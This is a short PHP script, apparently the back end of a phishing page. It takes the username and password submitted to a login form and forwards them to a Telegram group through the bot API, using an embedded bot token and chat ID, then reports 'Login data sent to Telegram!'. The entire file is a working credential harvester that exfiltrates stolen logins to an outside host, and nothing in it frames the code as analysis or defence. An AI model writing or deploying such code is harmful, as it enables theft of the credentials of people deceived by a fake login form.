<?php
// Replace with your bot's token and the chat ID of the group
$botToken = '7483746513:AAETGFmjR-OcqiCHnjxeoK2eo4ahN00eB5I';
$chatId = '-1002188442823';

if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $username = $_POST['username'];
    $password = $_POST['password'];

    // Format the message
    $message = "Username: $username\nPassword: $password";

    // Send the message to the Telegram group
    $url = "https://api.telegram.org/bot$botToken/sendMessage";

    $data = [
        'chat_id' => $chatId,
        'text' => $message
    ];

    $options = [
        'http' => [
            'header'  => "Content-type: application/x-www-form-urlencoded\r\n",
            'method'  => 'POST',
            'content' => http_build_query($data),
        ],
    ];
    $context  = stream_context_create($options);
    $result = file_get_contents($url, false, $context);

    if ($result === FALSE) {
        die('Error');
    }

    echo "Login data sent to Telegram!";
}
?>
